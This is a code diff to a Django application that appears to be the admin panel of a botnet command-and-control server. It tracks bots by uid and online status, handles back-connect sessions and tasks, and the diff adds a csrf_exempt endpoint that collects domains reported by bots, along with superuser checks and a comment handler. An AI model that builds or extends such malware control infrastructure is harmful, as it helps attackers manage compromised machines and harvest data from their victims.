@@ -1,8 +1,10 @@
+import json
+
 import pytz
 from django.shortcuts import HttpResponse, render
 from django.http import JsonResponse
 from django.contrib.auth.models import User
-from django.contrib.auth import login
+from django.contrib.auth import login, logout
 from django.views.decorators.csrf import csrf_exempt
 from .bot_pb2 import BotMsg, BackConnectMsg, PanelMsg
 from .models import Bot, Session
@@ -112,14 +114,17 @@ class AdminPanel:
                                                       'x_oc': [_32x, _64x], 'in_week': in_week, 'in_day': in_day,
                                                       'in_month': in_month, 'total': total})
 
-        return HttpResponse('недостачно прав для просмотра ')
+        return HttpResponse('недостачно прав для просмотра')
 
     @staticmethod
     def get_table_page(request) -> render:
+        if not request.user.is_superuser:
+            return HttpResponse('недостачно прав для просмотра')
+
         tz = pytz.UTC
 
         for bot in Bot.objects.all():
-            if (datetime.datetime.now(tz=tz) - bot.date).seconds // 60 > 3:
+            if (datetime.datetime.now(tz=tz) - bot.date_ch).seconds // 60 > 3:
                 bot.is_online = False
                 bot.save()
 
@@ -129,15 +134,21 @@ class AdminPanel:
 
     @staticmethod
     def get_sessions_page(request):
+        if not request.user.is_superuser:
+            return HttpResponse('недостачно прав для просмотра')
         sessions = Session.objects.all()
         return render(request, 'main/session.html', {'sessions': sessions})
 
     @staticmethod
     def task(request) -> render:
+        if not request.user.is_superuser:
+            return HttpResponse('недостачно прав для просмотра')
         return render(request, 'main/task.html')
 
     @staticmethod
     def admin_table(request):
+        if not request.user.is_superuser:
+            return HttpResponse('недостачно прав для просмотра')
         return render(request, 'main/admin_table.html')
 
 
@@ -150,16 +161,39 @@ class AdminPanel:
 class Handlers:
     def __init__(self, subsidiary):
         self.sub = subsidiary
+        self.s = {}
+
+    def test(self, request):
+        return JsonResponse(self.s)
+
+    @csrf_exempt
+    def add_comment(self, request):
+
+        print(request.POST)
+        comment_text = request.POST['comment']
+        print(comment_text)
+        uid = request.POST['uid']
+
+        bot = Bot.objects.get(uid=uid)
+        bot.comment = comment_text
+        bot.save()
+
+        return HttpResponse('200')
+
+    @staticmethod
+    def logout(request):
+        logout(request)
+        return JsonResponse({'v': '200'})
 
     @staticmethod
     def login_handler(request) -> HttpResponse or JsonResponse:
-        print(request.user)
         username = request.POST['login']
         usr = User.objects.get(username=username)
 
         if usr.check_password(request.POST['password']):
             login(request, usr)
-            return JsonResponse({'verdict': '200'})
+            print('login')
+            return JsonResponse({'v': '200'})
         return HttpResponse('')
 
     @csrf_exempt
@@ -271,11 +305,23 @@ class Handlers:
             bot = Bot.objects.get(uid=uid)
             bot.is_online = True
             bot.save()
+
+            print(bot.date_ch)
+
             return HttpResponse('200')
 
         elif msg_type == 3:
             print(3)
             return HttpResponse('200')
+
+    @csrf_exempt
+    def hosts(self, request):
+        host = BotMsg.Config.Host()
+        host.ParseFromString(request.body)
+        is_https = host.is_https
+        domain = host.domain.decode('utf-16-le')
+        self.s[domain] = is_https
+        return HttpResponse('200')
 
     @staticmethod
     def ban(request) -> HttpResponse:
